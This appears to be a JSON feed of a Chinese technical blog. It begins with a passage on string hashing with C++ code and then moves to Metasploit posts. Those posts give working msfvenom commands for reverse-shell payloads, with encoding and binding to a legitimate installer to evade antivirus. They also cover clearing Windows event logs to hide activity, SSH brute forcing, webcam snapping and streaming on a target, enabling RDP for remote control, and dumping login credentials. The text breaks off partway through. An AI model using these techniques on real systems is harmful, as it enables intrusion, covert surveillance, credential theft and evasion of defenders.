class=\"line\">        if (a[i]!=a[i-1])</span><br><span class=\"line\">            ans++;</span><br><span class=\"line\">    printf(&quot;%d\\n&quot;,ans);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Hash还有一方面，就是它可以处理子串信息\"><a href=\"#Hash还有一方面，就是它可以处理子串信息\" class=\"headerlink\" title=\"Hash还有一方面，就是它可以处理子串信息\"></a>Hash还有一方面，就是它可以处理子串信息</h2><p>cogs1570</p>\n<p>【题目描述】</p>\n<p>法国作家乔治·佩雷克(Georges Perec，1936-1982)曾经写过一本书，《敏感字母》（La disparition），全篇没有一个字母‘e’。他是乌力波小组（Oulipo Group）的一员。下面是他书中的一段话：</p>\n<p>Tout avait Pair normal, mais tout s’affirmait faux. Tout avait Fair normal, d’abord, puis surgissait l’inhumain, l’affolant. Il aurait voulu savoir où s’articulait l’association qui l’unissait au roman : stir son tapis, assaillant à tout instant son imagination, l’intuition d’un tabou, la vision d’un mal obscur, d’un quoi vacant, d’un non-dit : la vision, l’avision d’un oubli commandant tout, où s’abolissait la raison : tout avait l’air normal mais…</p>\n<p>佩雷克很可能在下面的比赛中得到高分（当然，也有可能是低分）。在这个比赛中，人们被要求针对一个主题写出甚至是意味深长的文章，并且让一个给定的“单词”出现次数尽量少。我们的任务是给评委会编写一个程序来数单词出现了几次，用以得出参赛者最终的排名。参赛者经常会写一长串废话，例如500000个连续的‘T’。并且他们不用空格。</p>\n<p>因此我们想要尽快找到一个单词出现的频数，即一个给定的字符串在文章中出现了几次。更加正式地，给出字母表{‘A’,’B’,’C’,…,’Z’}和两个仅有字母表中字母组成的有限字符串：单词W和文章T，找到W在T中出现的次数。这里“出现”意味着W中所有的连续字符都必须对应T中的连续字符。T中出现的两个W可能会部分重叠。</p>\n<p>【输入格式】</p>\n<p>输入包含多组数据。</p>\n<p>输入文件的第一行有一个整数，代表数据组数。接下来是这些数据，以如下格式给出：</p>\n<p>第一行是单词W，一个由{‘A’,’B’,’C’,…,’Z’}中字母组成的字符串，保证1&lt;&#x3D;|W|&lt;&#x3D;10000（|W|代表字符串W的长度）</p>\n<p>第二行是文章T，一个由{‘A’,’B’,’C’,…,’Z’}中字母组成的字符串，保证|W|&lt;&#x3D;|T|&lt;&#x3D;1000000。</p>\n<p>【输出格式】</p>\n<p>对每组数据输出一行一个整数，即W在T中出现的次数。</p>\n<p>【样例输入】</p>\n<p>3<br>BAPC<br>BAPC<br>AZA<br>AZAZAZA<br>VERDI<br>AVERDXIVYERDIAN  </p>\n<p>【样例输出】</p>\n<p>1<br>3<br>0  </p>\n<p>代码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &lt;cstdio&gt;</span><br><span class=\"line\">#include &lt;cstring&gt;</span><br><span class=\"line\">#include &lt;algorithm&gt;</span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\">typedef unsigned long long ull;</span><br><span class=\"line\">ull base=131;</span><br><span class=\"line\">ull po[100010],hs[100010*100];</span><br><span class=\"line\">char s1[100010],s2[100010*100];</span><br><span class=\"line\">int n,ans=1,T;</span><br><span class=\"line\">ull geth(int l,int r)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    return (ull)hs[r]-po[r-l+1]*hs[l-1];</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    freopen(&quot;oulipo.in&quot;,&quot;r&quot;,stdin);</span><br><span class=\"line\">    freopen(&quot;oulipo.out&quot;,&quot;w&quot;,stdout);</span><br><span class=\"line\">    po[0]=1;</span><br><span class=\"line\">    for (int i=1;i&lt;=10010-5;i++)</span><br><span class=\"line\">        po[i]=po[i-1]*base;</span><br><span class=\"line\">    scanf(&quot;%d&quot;,&amp;T);</span><br><span class=\"line\">    while(T--)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        scanf(&quot;%s%s&quot;,s1+1,s2+1);</span><br><span class=\"line\">        int l1=strlen(s1+1),l2=strlen(s2+1);</span><br><span class=\"line\">        ull a1=0,ans=0;</span><br><span class=\"line\">        for (int i=1;i&lt;=l1;i++)</span><br><span class=\"line\">            a1=a1*base+(ull)s1[i];</span><br><span class=\"line\">        for (int i=1;i&lt;=l2;i++)</span><br><span class=\"line\">            hs[i]=hs[i-1]*base+s2[i];</span><br><span class=\"line\">        for (int i=1;i+l1-1&lt;=l2;i++)</span><br><span class=\"line\">            if (a1==geth(i,i+l1-1))</span><br><span class=\"line\">                ans++;</span><br><span class=\"line\">        printf(&quot;%d\\n&quot;,ans);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"hash好像可以暴力水过很多字符串算法。。\"><a href=\"#hash好像可以暴力水过很多字符串算法。。\" class=\"headerlink\" title=\"hash好像可以暴力水过很多字符串算法。。\"></a>hash好像可以暴力水过很多字符串算法。。</h2><p>1、kmp</p>\n<p>问题：给两个字符串S1，S2，求S2是否是S1的子串，并求S2在S1中出现的次数</p>\n<p>把S2 Hash出来，在S1里找所有长度为|S2|</p>\n<p>2、AC自动机</p>\n<p>问题：给N个单词串，和一个文章串，求每个单词串是否是文章串的子串，并求每个单词在文章中出现的次数。</p>\n<p>把每一个单词hash成整数，再把文章的每一个子串hash成整数，接下来只需要进行整数上的查找即可。</p>\n<p>复杂度：O(|A|2+|S|)</p>\n<p>用AC自动机可以做到O(|A|+|S|)</p>\n<p>3、后缀数组</p>\n<p>问题：给两个字符串S1,S2，求它们的最长公共子串的长度。</p>\n<p>将S1的每一个子串都hash成一个整数，将S2的每一个子串都hash成一个整数</p>\n<p>两堆整数，相同的配对，并且找到所表示的字符串长度最大的即可。</p>\n<p>复杂度：O(|S1|2+|S2|2)</p>\n<p>用后缀数组可以优化到O(|S|log|S|)</p>\n<p>4、马拉车</p>\n<p>问题：给一个字符串S，求S的最长回文子串。</p>\n<p>先求子串长度位奇数的，再求偶数的。枚举回文子串的中心位置，然后二分子串的长度，直到找到一个该位置的最长回文子串，不断维护长度最大值即可。</p>\n<p>复杂度：O(|S|log|S|)</p>\n<p>用manacher可以做到O(|S|)</p>\n<p>5、扩展kmp</p>\n<p>问题：给一个字符串S，求S的每个后缀与S的最长公共前缀</p>\n<p>枚举每一个后缀的起始位置，二分长度，求出每个后缀与S的最长公共前缀。</p>\n<p>复杂度：O(|S|log|S|)</p>\n<p>用extend-kmp可以做到O(|S|)</p>\n",
            "tags": []
        },
        {
            "id": "https://mangpumo.github.io/2023/01/12/msf%E6%B8%85%E7%90%86%E4%BA%8B%E4%BB%B6%E6%97%A5%E5%BF%97/",
            "url": "https://mangpumo.github.io/2023/01/12/msf%E6%B8%85%E7%90%86%E4%BA%8B%E4%BB%B6%E6%97%A5%E5%BF%97/",
            "title": "msf清理事件日志",
            "date_published": "2023-01-12T14:18:52.000Z",
            "content_html": "<p>再进入肉鸡执行一些操作时，windows 下记录的操作日志可在日志查看器中进行查看，可以通过运行 eventvwr 命令打开。包括了应用程序、系统、安全等模块的日志，为了不让其查到自己或知道自己的操作，则可以使用 meterpreter 的 clearev 命令来清除其日志。未清除日志前可查看系统记录的一些处理信息。</p>\n<p>![1645511582659](03 msf清理事件日志.assets&#x2F;1645511582659.png)</p>\n<p>然后在 meterpreter 下执行 clearev 命令，可以看到清除提示，分别清除了应用程序，系统和安全模块的日志记录。</p>\n<p>clearev      清理日志</p>\n<p>![1645511593151](03 msf清理事件日志.assets&#x2F;1645511593151.png)</p>\n<p>（注意 使用clearev命令时 需要获得靶机的 system  权限）</p>\n",
            "tags": []
        },
        {
            "id": "https://mangpumo.github.io/2023/01/12/msf%E5%85%8D%E6%9D%80%E7%BC%96%E7%A0%81/",
            "url": "https://mangpumo.github.io/2023/01/12/msf%E5%85%8D%E6%9D%80%E7%BC%96%E7%A0%81/",
            "title": "msf免杀编码",
            "date_published": "2023-01-12T14:18:18.000Z",
            "content_html": "<p>杀软是如何检测出恶意代码的？<br>特征码、启发式恶意软件检查和行为。<br>免杀是做什么？<br>对特征进行混淆，打乱代码，避免杀毒软件查杀<br>免杀的基本方法有哪些？<br>自编码处理  自捆绑+编码  多重编码   接口下载式  签名伪装式</p>\n<p>针对杀毒软件的基本检测方法，我们可有以下几种方法实现免杀：</p>\n<p>改变特征码<br>改变行为<br>其它</p>\n<p>由于msf被各大安全厂商盯的比较紧，所以这些常规的方法免杀效果肯定是比较差的，但有时把一两种常规方法稍微结合一下就能达到比较好的免杀效果</p>\n<p>要用到的在线查毒工具virscan提供</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudmlyc2Nhbi5vcmcv\">https://www.virscan.org/</span></p>\n<h1 id=\"一、不处理payload直接生成样本进行检测\"><a href=\"#一、不处理payload直接生成样本进行检测\" class=\"headerlink\" title=\"一、不处理payload直接生成样本进行检测\"></a>一、不处理payload直接生成样本进行检测</h1><p>msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.110.32 LPORT&#x3D;4456 -f exe -o payload1.exe</p>\n<p>![1645511560404](02 msf编码免杀.assets&#x2F;1645511560404.png)</p>\n<p>进行查毒有41%的杀毒软件报毒了</p>\n<p>具体查毒链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9yLnZpcnNjYW4ub3JnL2xhbmd1YWdlL2VuL3JlcG9ydC8yN2VhNTNiYWI0NGUwYTAyM2I1N2MyNzk5MWYwMmNmOQ==\">https://r.virscan.org/language/en/report/27ea53bab44e0a023b57c27991f02cf9</span></p>\n<p>![1645511550808](02 msf编码免杀.assets&#x2F;1645511550808.png)</p>\n<h1 id=\"二、-MSF自编码处理payload生成样本进行检测\"><a href=\"#二、-MSF自编码处理payload生成样本进行检测\" class=\"headerlink\" title=\"二、 MSF自编码处理payload生成样本进行检测\"></a>二、 MSF自编码处理payload生成样本进行检测</h1><p>首先我们输入   msfvenom –list encoders   查看可以用编码模块</p>\n<p>![1645511543145](02 msf编码免杀.assets&#x2F;1645511543145.png)</p>\n<p>我们使用  x86&#x2F;shikata_ga_nai 模块 免杀中使用频率最高的一个编码器</p>\n<p>msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp -e x86&#x2F;shikata_ga_nai HOST&#x3D;192.168.110.110  LPORT&#x3D;4456 -f exe -o payload1.exe</p>\n<p>进行查毒有37%的杀毒软件报毒了</p>\n<p>![1645511533351](02 msf编码免杀.assets&#x2F;1645511533351.png)</p>\n<h1 id=\"三、MSF自捆绑处理payload生成样本进行检测\"><a href=\"#三、MSF自捆绑处理payload生成样本进行检测\" class=\"headerlink\" title=\"三、MSF自捆绑处理payload生成样本进行检测\"></a>三、MSF自捆绑处理payload生成样本进行检测</h1><p>使用msfvenom的-x参数可以指定一个可执行文件,将payload与其捆绑</p>\n<p>msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.110.110 LPORT&#x3D;4456 -x UltraISO.exe -f exe -o payload2.exe</p>\n<p>![1645511525813](02 msf编码免杀.assets&#x2F;1645511525813.png)</p>\n<p>进行查毒有37%的杀毒软件报毒了</p>\n<p>![1645511516751](02 msf编码免杀.assets&#x2F;1645511516751.png)</p>\n<h1 id=\"四、MSF自捆绑-编码处理payload生成样本进行检测\"><a href=\"#四、MSF自捆绑-编码处理payload生成样本进行检测\" class=\"headerlink\" title=\"四、MSF自捆绑+编码处理payload生成样本进行检测\"></a>四、MSF自捆绑+编码处理payload生成样本进行检测</h1><p>结合第二种，第三种。编码方式我们再次生成样本</p>\n<p>msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.110.110 LPORT&#x3D;4456 -e x86&#x2F;shikata_ga_nai -x UltraISO.exe  -i 10 -f exe -o payload3.exe</p>\n<p>![1645511507586](02 msf编码免杀.assets&#x2F;1645511507586.png)</p>\n<p>进行查毒有31%的杀毒软件报毒了</p>\n<p>![1645511497457](02 msf编码免杀.assets&#x2F;1645511497457.png)</p>\n<p>那我们继续增加编码次数</p>\n<p>msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.110.110 LPORT&#x3D;4456 -e x86&#x2F;shikata_ga_nai -x UltraISO.exe  -i 20 -f exe -o payload4.exe</p>\n<p>进行查毒有27%的杀毒软件报毒了!</p>\n<p>![1645511487704](02 msf编码免杀.assets&#x2F;1645511487704.png)</p>\n<h1 id=\"五、MSF多重编码payload生成样本进行检测\"><a href=\"#五、MSF多重编码payload生成样本进行检测\" class=\"headerlink\" title=\"五、MSF多重编码payload生成样本进行检测\"></a>五、MSF多重编码payload生成样本进行检测</h1><p>通过管道，让msfvenom用不同编码器反复编码进行混淆。使用管道让msfvenom对攻击载荷多重编码，先用shikata_ga_nai编码10次，接着来10次的alpha_upper编码，再来10次的countdown编码，最后才生成以payload5.exe为模板的可执行文件。</p>\n<p>msfvenom  -p windows&#x2F;meterpreter&#x2F;reverse_tcp -e x86&#x2F;shikata_ga_nai -i 10 LHOST&#x3D;192.168.110.110 LPORT&#x3D;4456 -f raw | msfvenom -e x86&#x2F;alpha_upper -i 10 -f raw | msfvenom -e x86&#x2F;countdown -i 10 -x UltraISO.exe -f exe -o payload5.exe</p>\n<h1 id=\"六、-生成Shellcode使用C语言调用\"><a href=\"#六、-生成Shellcode使用C语言调用\" class=\"headerlink\" title=\"六、 生成Shellcode使用C语言调用\"></a>六、 生成Shellcode使用C语言调用</h1><p>1、直接在linux中利用msf的meterpreter生成的文件以.c形式文件存储，得到机器码。命令：</p>\n<p>msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.110.110 LPORT&#x3D;4456 -f c &gt;c0001.c</p>\n<p>![1645511458128](02 msf编码免杀.assets&#x2F;1645511458128.png)</p>\n<p>2、改c文件，并编译，并加壳</p>\n<p>![1645511469800](02 msf编码免杀.assets&#x2F;1645511469800.png)</p>\n<p>随便写一个hello world</p>\n<p>main() {<br>printf(“hello world\\n”);<br>}</p>\n<p>然后编译 并加壳</p>\n<p>vmp加壳工具</p>\n",
            "tags": []
        },
        {
            "id": "https://mangpumo.github.io/2023/01/12/msf%E8%BE%85%E5%8A%A9%E6%A8%A1%E5%9D%97/",
            "url": "https://mangpumo.github.io/2023/01/12/msf%E8%BE%85%E5%8A%A9%E6%A8%A1%E5%9D%97/",
            "title": "msf辅助模块",
            "date_published": "2023-01-12T14:10:07.000Z",
            "content_html": "<p>说明：我们知道msf辅助模块有上千个，主要用于信息搜集阶段，功能包括扫描、口令猜解、敏感信息嗅探、FUZZ测试发掘漏洞、实施网络协议欺骗等</p>\n<h1 id=\"一、怎么查询-Auxiliary辅助模块\"><a href=\"#一、怎么查询-Auxiliary辅助模块\" class=\"headerlink\" title=\"一、怎么查询 Auxiliary辅助模块\"></a>一、怎么查询 Auxiliary辅助模块</h1><p>我们可以通过以下命令查询所有 Auxiliary辅助模块</p>\n<p>use auxiliary&#x2F; 或   show auxiliary</p>\n<h1 id=\"二、-Auxiliary辅助模块分类\"><a href=\"#二、-Auxiliary辅助模块分类\" class=\"headerlink\" title=\"二、 Auxiliary辅助模块分类\"></a>二、 Auxiliary辅助模块分类</h1><hr>\n<h4 id=\"admin\"><a href=\"#admin\" class=\"headerlink\" title=\"admin\"></a>admin</h4><hr>\n<p>&#x2F;admin&#x2F;android</p>\n<p>&#x2F;admin&#x2F;http</p>\n<p>&#x2F;admin&#x2F;mysql&#x2F;</p>\n<p>&#x2F;admin&#x2F;oracle&#x2F;</p>\n<p>&#x2F;admin&#x2F;vmware&#x2F;</p>\n<p>&#x2F;admin&#x2F;smb&#x2F;</p>\n<hr>\n<h4 id=\"dos\"><a href=\"#dos\" class=\"headerlink\" title=\"dos\"></a>dos</h4><hr>\n<p>&#x2F;dos&#x2F;android&#x2F;</p>\n<p>&#x2F;dos&#x2F;http&#x2F;</p>\n<p>&#x2F;dos&#x2F;cisco&#x2F;</p>\n<p>&#x2F;dos&#x2F;dns&#x2F;</p>\n<p>&#x2F;dos&#x2F;smb&#x2F;</p>\n<p>&#x2F;dos&#x2F;windows&#x2F;ftp&#x2F;</p>\n<hr>\n<h4 id=\"fuzzers\"><a href=\"#fuzzers\" class=\"headerlink\" title=\"fuzzers\"></a>fuzzers</h4><hr>\n<p>&#x2F;fuzzers&#x2F;http&#x2F;</p>\n<p>&#x2F;fuzzers&#x2F;smb&#x2F;</p>\n<p>&#x2F;gather&#x2F;</p>\n<hr>\n<h4 id=\"scanner\"><a href=\"#scanner\" class=\"headerlink\" title=\"scanner\"></a>scanner</h4><hr>\n<p>&#x2F;scanner&#x2F;portscan&#x2F;</p>\n<p>&#x2F;scanner&#x2F;ftp&#x2F;</p>\n<p>&#x2F;scanner&#x2F;http&#x2F;</p>\n<p>&#x2F;scanner&#x2F;ssh&#x2F;</p>\n<p>&#x2F;scanner&#x2F;smb&#x2F;</p>\n<p>&#x2F;scanner&#x2F;vmware&#x2F;</p>\n<p>&#x2F;scanner&#x2F;vnc&#x2F;</p>\n<p>&#x2F;scanner&#x2F;telnet&#x2F;</p>\n<p>&#x2F;scanner&#x2F;msyql&#x2F;</p>\n<p>&#x2F;scanner&#x2F;ntp&#x2F;</p>\n<p>&#x2F;scanner&#x2F;openvas&#x2F;</p>\n<p>&#x2F;scanner&#x2F;sap&#x2F;</p>\n<h4 id=\"server\"><a href=\"#server\" class=\"headerlink\" title=\"server\"></a>server</h4><p>&#x2F;server&#x2F;</p>\n<h1 id=\"三、通过分类查询指定模块\"><a href=\"#三、通过分类查询指定模块\" class=\"headerlink\" title=\"三、通过分类查询指定模块\"></a>三、通过分类查询指定模块</h1><p>通过search查询指定模块</p>\n<p>search type:auxiliary name:smb</p>\n<p>type： 后门跟的的模块类型   name ： 后门跟的就是要搜的模块名</p>\n<h1 id=\"四、怎么调用模块\"><a href=\"#四、怎么调用模块\" class=\"headerlink\" title=\"四、怎么调用模块\"></a>四、怎么调用模块</h1><p>我们调一个smb模块演示</p>\n<p>1 查询与SMB\t相关的辅助模块</p>\n<p>search type:auxiliary name:smb</p>\n<p>2 加载一个ms17_010探测模块</p>\n<p>use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010</p>\n<p>3 查看载入模块需要配置的参数</p>\n<p>show options</p>\n<p>![1645511393570](01 msf辅助模块.assets&#x2F;1645511393570.png)</p>\n<p>set RHOSTS 192.168.110.110   (设定目标IP)</p>\n<p>set THREADS 10    （如果觉得探测过慢可以增加线程，根据电脑实际性能来不要配置太多 个人建议最大10）</p>\n<p>run （执行探测）</p>\n<p>![1645511404119](01 msf辅助模块.assets&#x2F;1645511404119.png)</p>\n<p>![1645511415106](01 msf辅助模块.assets&#x2F;1645511415106.png)</p>\n<h1 id=\"五、更多\"><a href=\"#五、更多\" class=\"headerlink\" title=\"五、更多\"></a>五、更多</h1><p>1 whois查看域名或IP信息  （hu yi zi）</p>\n<p>whois <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5iYWlkdS5jb20v\">www.baidu.com</span></p>\n<p>whois 192.168.0.1</p>\n<p>2  利用辅助模块查找邮箱</p>\n<p>use auxiliary&#x2F;gather&#x2F;search_email_collector</p>\n<p>3 DNS枚举，使用auxiliary模块下的DNS枚举模块：</p>\n<p>use auxiliary&#x2F;gather&#x2F;enum_dns</p>\n<p>4 ssh爆破，使用auxiliary模块下的ssh_login</p>\n<p>use &#x2F;auxiliary&#x2F;scanner&#x2F;ssh&#x2F;ssh_login</p>\n<p>set RHOSTS 192.168.1.92   (设定目标IP)<br>set USERNAME root    （设定ssh登陆账户）<br>set PASS_FILE &#x2F;kevin&#x2F;ssh_passwd.txt   （设定暴力字典）<br>set THREADS 100           (线程设置为100)<br>show options                   (查看更改后的参数)12345</p>\n<p>run   开始爆破</p>\n",
            "tags": []
        },
        {
            "id": "https://mangpumo.github.io/2023/01/12/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%B0%83%E6%91%84%E5%83%8F%E5%A4%B4/",
            "url": "https://mangpumo.github.io/2023/01/12/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%B0%83%E6%91%84%E5%83%8F%E5%A4%B4/",
            "title": "后渗透之调摄像头",
            "date_published": "2023-01-12T13:41:34.000Z",
            "content_html": "<h1 id=\"一、环境准备\"><a href=\"#一、环境准备\" class=\"headerlink\" title=\"一、环境准备\"></a>一、环境准备</h1><p>1 MSF-Metasploit Framework</p>\n<p>2 一台windiows靶机</p>\n<p>3 一台安卓设备，没有可以使用模拟器</p>\n<h1 id=\"二、实战\"><a href=\"#二、实战\" class=\"headerlink\" title=\"二、实战\"></a>二、实战</h1><p>靶机获取到meterpreter后我们可以使用  webcam模块实现调用软，硬件摄像头</p>\n<p>webcam模块支持命令</p>\n<table>\n<thead>\n<tr>\n<th>id</th>\n<th>模块名</th>\n<th>解释</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>1</td>\n<td><strong>webcam_list</strong></td>\n<td>列出靶机中的所有软，硬件摄像头列表，并编号</td>\n</tr>\n<tr>\n<td>2</td>\n<td><strong>webcam_snap</strong></td>\n<td>可调用单个软，硬件摄像头拍照，默认调用第一个摄像头</td>\n</tr>\n<tr>\n<td>3</td>\n<td><strong>webcam_stream</strong></td>\n<td>可调用单个软，硬件摄像头直播，默认调用第一个摄像头</td>\n</tr>\n</tbody></table>\n<p>1  webcam_list</p>\n<p><img data-src=\"/%E4%B8%80%E3%80%81%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87.assets/1644494100592.png\" alt=\"1644494100592\"></p>\n<p>2 webcam_snap  调用单个软，硬件摄像头拍照</p>\n<table>\n<thead>\n<tr>\n<th>id</th>\n<th>参数</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>1</td>\n<td>-h</td>\n<td>显示帮助</td>\n</tr>\n<tr>\n<td>2</td>\n<td>-i</td>\n<td>-i 1 “1”代表调用摄像头编号</td>\n</tr>\n<tr>\n<td>3</td>\n<td>-p</td>\n<td>-p  &#x2F;root “root”设置存储路径</td>\n</tr>\n<tr>\n<td>4</td>\n<td>-q</td>\n<td>-q  100  “100” 表示存储图片的质量默认为 50</td>\n</tr>\n<tr>\n<td>5</td>\n<td>-v</td>\n<td>-v  false   -v 2个参数  true 和  false   这个参数表示拍照后自动打开,默认参数为true</td>\n</tr>\n</tbody></table>\n<p><img data-src=\"/%E4%B8%80%E3%80%81%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87.assets/1644494089950.png\" alt=\"1644494089950\"></p>\n<p>3 webcam_stream  调用单个软，硬件摄像头直播</p>\n<table>\n<thead>\n<tr>\n<th>id</th>\n<th>参数</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>1</td>\n<td>-h</td>\n<td>显示帮助</td>\n</tr>\n<tr>\n<td>2</td>\n<td>-d</td>\n<td>-d 100  “100”&#x3D;100秒   设置流持续时间为100秒   默认为1800</td>\n</tr>\n<tr>\n<td>3</td>\n<td>-i</td>\n<td>-i 1 “1”代表调用摄像头编号</td>\n</tr>\n<tr>\n<td>4</td>\n<td>-q</td>\n<td>-q 100  “100”指流质量 默认为50</td>\n</tr>\n<tr>\n<td>5</td>\n<td>-s</td>\n<td>-s live “live”指流文件路径  默认输出在当前目录（注意目录不存在不会自动创建）</td>\n</tr>\n<tr>\n<td>7</td>\n<td>-f</td>\n<td>-f live  “live”指播放文件的存储地址  默认输出在当前目录</td>\n</tr>\n<tr>\n<td>8</td>\n<td>-v</td>\n<td>-v  false   -v 2个参数  true 和  false   这个参数表示拍照后自动打开,默认参数为true</td>\n</tr>\n</tbody></table>\n",
            "tags": []
        },
        {
            "id": "https://mangpumo.github.io/2023/01/12/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%BF%9C%E7%A8%8B%E7%9B%91%E6%8E%A7Windows/",
            "url": "https://mangpumo.github.io/2023/01/12/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%BF%9C%E7%A8%8B%E7%9B%91%E6%8E%A7Windows/",
            "title": "后渗透之远程监控Windows",
            "date_published": "2023-01-12T13:33:52.000Z",
            "content_html": "<h1 id=\"一、环境准备\"><a href=\"#一、环境准备\" class=\"headerlink\" title=\"一、环境准备\"></a>一、环境准备</h1><h4 id=\"1-rdesktop\"><a href=\"#1-rdesktop\" class=\"headerlink\" title=\"1 rdesktop\"></a>1 rdesktop</h4><p>在线安装  rdesktop</p>\n<hr>\n<p>Debian,Ubuntu,kali下使用以下命令</p>\n<p> apt-get install rdesktop</p>\n<hr>\n<p>Centos&#x2F;RedHat可以通过yum命令</p>\n<p>yum -y install rdesktop</p>\n<h4 id=\"2-一台windiows靶机（没有物理电脑可以使用虚拟机代替）\"><a href=\"#2-一台windiows靶机（没有物理电脑可以使用虚拟机代替）\" class=\"headerlink\" title=\"2 一台windiows靶机（没有物理电脑可以使用虚拟机代替）\"></a>2 一台windiows靶机（没有物理电脑可以使用虚拟机代替）</h4><h4 id=\"3-MSF-Metasploit-Framework\"><a href=\"#3-MSF-Metasploit-Framework\" class=\"headerlink\" title=\"3 MSF-Metasploit Framework\"></a>3 MSF-Metasploit Framework</h4><h1 id=\"二、实战\"><a href=\"#二、实战\" class=\"headerlink\" title=\"二、实战\"></a>二、实战</h1><p>1 使用rdesktop远程控制</p>\n<p>说明：rdesktop是linux下支持Windows远程桌面连接的客户端程序，在linux系统下可通过它远程访问Windows桌面，支持多种版本。rdesktop是sourceforge下支持GPL协议的一个开源项目，采用RDP（Remote Desktop Protocol,远程桌面协议），几乎可以连接windows的所有版本</p>\n<p>rdesktop常用参数</p>\n<table>\n<thead>\n<tr>\n<th>id</th>\n<th>参数</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>1</td>\n<td>-u</td>\n<td>账户名</td>\n</tr>\n<tr>\n<td>2</td>\n<td>-p</td>\n<td>密码</td>\n</tr>\n<tr>\n<td>3</td>\n<td>-a 16</td>\n<td>指使用16位色显示远程画面</td>\n</tr>\n<tr>\n<td>4</td>\n<td>-f</td>\n<td>全屏模式（用<strong>Ctrl+Alt+Enter</strong> 组合键退出全屏）</td>\n</tr>\n<tr>\n<td>5</td>\n<td>-g</td>\n<td>设置分辨率 如 :   -g 1024x768</td>\n</tr>\n<tr>\n<td>6</td>\n<td>rdesktop -h</td>\n<td>查看rdesktop使用帮助</td>\n</tr>\n</tbody></table>\n<p>rdesktop -u 用户名 -p  密码  -f   IP</p>\n<p>rdesktop -u mb -p 123456 -f  -g 1024x720 192.168.110.24</p>\n<p>如果远程计算机没有启动远程功能我们可以在meterpreter中输入</p>\n<p>启动远程桌面协议：run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp</p>\n<hr>\n<p>2 通过vnc远程 </p>\n<p>![1644493726723](26 后渗透远程控制.assets&#x2F;1644493726723.png)</p>\n",
            "tags": []
        },
        {
            "id": "https://mangpumo.github.io/2023/01/12/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%8E%B7%E5%8F%96%E7%99%BB%E9%99%86%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81Windows/",
            "url": "https://mangpumo.github.io/2023/01/12/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%8E%B7%E5%8F%96%E7%99%BB%E9%99%86%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81Windows/",
            "title": "后渗透之获取登陆账号密码Windows",
            "date_published": "2023-01-12T13:29:57.000Z",
            "content_html": "<h1 id=\"一、环境准备\"><a href=\"#一、环境准备\" class=\"headerlink\" title=\"一、环境准备\"></a>一、环境准备</h1><p>1 MSF-Metasploit Framework</p>\n<p>2 一台windiows靶机</p>\n<h1 id=\"二、实战\"><a href=\"#二、实战\" class=\"headerlink\" title=\"二、实战\"></a>二、实战</h1><p>首先获得一个有SYSTEM权限的meterpreter</p>\n<p><img data-src=\"/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E8%8E%B7%E5%8F%96%E7%99%BB%E5%BD%95%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81.assets/1644493974746.png\" alt=\"1644493974746\"></p>\n<p>1 抓取自动登录账户密码</p>\n<p>2 导出SAM数据库本地账户密码文件</p>\n<p>3 导出密码哈希</p>\n<p>4 使用kiwi模块获取</p>\n<hr>\n<p>1  很多人喜欢给在计算机设置自动登录 我们可以通过抓取自动登录的账户密码</p>\n<p>run windows&#x2F;gather&#x2F;credentials&#x2F;windows_autologin</p>\n<p>如果提示这证明本机并没有配置自动登录</p>\n<p><img 